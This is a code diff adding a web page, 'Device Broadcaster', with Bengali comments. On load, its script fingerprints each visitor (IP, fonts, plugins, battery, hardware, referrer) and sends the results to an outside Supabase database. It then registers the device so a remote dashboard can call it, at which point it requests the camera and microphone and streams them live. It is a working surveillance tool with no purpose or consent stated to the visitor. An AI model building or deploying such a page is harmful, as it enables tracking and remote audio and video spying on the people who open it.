@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Broadcaster</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        body { font-family: 'Inter', sans-serif; }
+    </style>
+</head>
+<body class="bg-gray-900 text-gray-100 flex items-center justify-center min-h-screen">
+    <div class="text-center p-8 bg-gray-800 rounded-2xl shadow-2xl max-w-md w-full">
+        <svg class="mx-auto h-12 w-auto text-indigo-400" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" d="M7.864 4.243A7.5 7.5 0 0119.5 12c0 2.42-.944 4.626-2.47 6.314M12 9.75v3.75m0-10.5a7.5 7.5 0 01-7.5 7.5c-2.42 0-4.626-.944-6.314-2.47m14.263-1.031L12 12.001" /></svg>
+        <h1 id="main-heading" class="mt-4 text-2xl font-bold tracking-tight text-white sm:text-3xl">Data Collection in Progress</h1>
+        <p id="main-paragraph" class="mt-4 text-gray-400">Your device information is being securely collected.</p>
+        <div id="status" class="mt-6 p-3 bg-gray-700 rounded-lg text-indigo-300 font-mono text-sm">Initializing...</div>
+    </div>
+
+    <script>
+        const SUPABASE_URL = 'https://gsmnzfbcxmhywznchoxq.supabase.co';
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdzbW56ZmJjeG1oeXd6bmNob3hxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY4NzI4NDgsImV4cCI6MjA3MjQ0ODg0OH0.0seF_SbMoSP5RkEZRGLcfDM07yE2T0EdyGgpgXFcs6c';
+
+        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+        const statusElement = document.getElementById('status');
+        let myPeerId = null;
+        let localStream = null;
+        let heartbeatInterval = null;
+
+        function updateStatus(message) { console.log(message); statusElement.textContent = message; }
+        function getGpuInfo() { /* ... আগের মতোই ... */ return 'N/A'; }
+
+        // হার্টবিট ফাংশন
+        function sendHeartbeat() {
+            if (!myPeerId) return;
+            supabase
+                .from('active_streams')
+                .update({ last_seen: new Date().toISOString() })
+                .eq('peer_id', myPeerId)
+                .then(({ error }) => {
+                    if (error) console.error('Heartbeat failed:', error);
+                });
+        }
+
+        const peer = new Peer();
+
+        peer.on('open', async (id) => {
+            myPeerId = id;
+            await supabase.from('active_streams').insert({ peer_id: id, user_agent: navigator.userAgent, last_seen: new Date().toISOString() });
+            updateStatus('Device registered. Waiting for a call...');
+            document.getElementById('main-heading').textContent = 'Device is Online';
+            document.getElementById('main-paragraph').textContent = 'This device is now discoverable on the dashboard.';
+            
+            // রেজিস্ট্রেশন সফল হলে হার্টবিট পাঠানো শুরু করুন
+            if (heartbeatInterval) clearInterval(heartbeatInterval);
+            heartbeatInterval = setInterval(sendHeartbeat, 10000); // প্রতি ১০ সেকেন্ডে
+        });
+
+        peer.on('call', async (call) => {
+            updateStatus('Incoming call... Requesting permissions...');
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                localStream = stream;
+                updateStatus('Permissions granted. Streaming live...');
+                call.answer(stream);
+            } catch (err) { console.error('Failed to get local stream', err); updateStatus('Error: Could not access camera/microphone.'); }
+        });
+        
+        peer.on('connection', (conn) => {
+            conn.on('data', (data) => {
+                if (data === 'stop' && localStream) {
+                    updateStatus('Stream stopped by dashboard.');
+                    localStream.getTracks().forEach(track => track.stop());
+                    localStream = null;
+                }
+            });
+        });
+
+        peer.on('error', (err) => { updateStatus(`Connection error: ${err.message}`); });
+
+        window.addEventListener('beforeunload', async () => {
+            if (heartbeatInterval) clearInterval(heartbeatInterval);
+            if (myPeerId) {
+                // এটি একটি দ্রুত চেষ্টার জন্য রাখা হলো, কিন্তু মূল কাজ হার্টবিট করবে
+                await supabase.from('active_streams').delete().eq('peer_id', myPeerId);
+            }
+        });
+
+
+        // --- তথ্য সংগ্রহের ফাংশন (আগের মতোই) ---
+        async function collectAndSaveInitialData() {
+            try {
+                updateStatus('Initial data collection started...');
+                let data = {};
+
+                // 1. IP Address
+                updateStatus('Fetching IP Address...');
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    data.ip_address = ipData.ip;
+                } catch (e) {
+                    data.ip_address = 'Unavailable';
+                }
+
+                // 2. Device Type
+                updateStatus('Analyzing device type...');
+                data.device_type = /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                // 3. Browser and Version (User Agent String)
+                updateStatus('Detecting browser...');
+                data.user_agent = navigator.userAgent;
+
+                // 4. Operating System
+                updateStatus('Detecting OS...');
+                data.operating_system = navigator.platform;
+
+                // 5. Screen Resolution
+                updateStatus('Getting screen resolution...');
+                data.screen_resolution = `${window.screen.width}x${window.screen.height}`;
+
+                // 6. Time Zone
+                updateStatus('Getting time zone...');
+                data.time_zone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+                // 7. Installed Fonts
+                updateStatus('Checking for common fonts...');
+                const commonFonts = ['Arial', 'Verdana', 'Helvetica', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Roboto'];
+                const installedFonts = commonFonts.filter(font => document.fonts.check(`12px "${font}"`));
+                data.installed_fonts = installedFonts;
+
+                // 8. Installed Plugins
+                updateStatus('Listing browser plugins...');
+                data.installed_plugins = Array.from(navigator.plugins).map(p => ({ name: p.name, filename: p.filename }));
+                
+                // 9. Battery Status
+                updateStatus('Checking battery status...');
+                try {
+                    const battery = await navigator.getBattery();
+                    data.battery_status = {
+                        level: `${Math.round(battery.level * 100)}%`,
+                        charging: battery.charging
+                    };
+                } catch (e) {
+                    data.battery_status = 'N/A';
+                }
+
+                // 10. Language Settings
+                updateStatus('Reading language settings...');
+                data.language_settings = navigator.languages;
+                
+                // 11. Hardware Specs
+                updateStatus('Estimating hardware specs...');
+                data.hardware_specs = {
+                    cpu_cores: navigator.hardwareConcurrency,
+                    device_memory_gb: navigator.deviceMemory || 'N/A'
+                };
+
+                // 12. Browser Fingerprint (Detailed Object)
+                updateStatus('Generating detailed browser fingerprint...');
+                const gpuInfo = getGpuInfo();
+                data.fingerprint_details = {
+                    browser: data.user_agent,
+                    os: data.operating_system,
+                    resolution: data.screen_resolution,
+                    timezone: data.time_zone,
+                    fonts: data.installed_fonts,
+                    gpu: gpuInfo,
+                    plugins: data.installed_plugins.map(p => p.name),
+                    language: data.language_settings[0] || 'N/A',
+                    cpu_cores: data.hardware_specs.cpu_cores
+                };
+                
+                // Other data points...
+                data.session_data = {
+                    page_url: window.location.href,
+                    referrer: document.referrer
+                };
+                
+                // ক্যামেরা/মাইক্রোফোন অ্যাক্সেস চেক করার ব্লকটি এখান থেকে সরিয়ে দেওয়া হয়েছে,
+                // কারণ এটি এখন শুধুমাত্র কল আসলেই প্রয়োজন হয়।
+
+                updateStatus('All initial data collected. Sending to database...');
+                console.log('Final data packet for device_info:', data);
+
+                const { error } = await supabase.from('device_info').insert([data]);
+
+                if (error) {
+                    throw error;
+                }
+
+                updateStatus('Initial data has been saved to device_info table.');
+
+            } catch (error) {
+                console.error('Error during initial data collection:', error);
+                updateStatus(`Error: ${error.message}`);
+                document.getElementById('main-heading').textContent = 'An Error Occurred';
+                document.getElementById('main-paragraph').textContent = 'Could not save the device information.';
+                statusElement.classList.remove('text-indigo-300');
+                statusElement.classList.add('text-red-400');
+            }
+        }
+
+        // পেজ লোড হলে, প্রথমে তথ্য সংগ্রহ করে সেভ করা হবে
+        window.addEventListener('load', collectAndSaveInitialData);
+    </script>
+</body>
+</html>
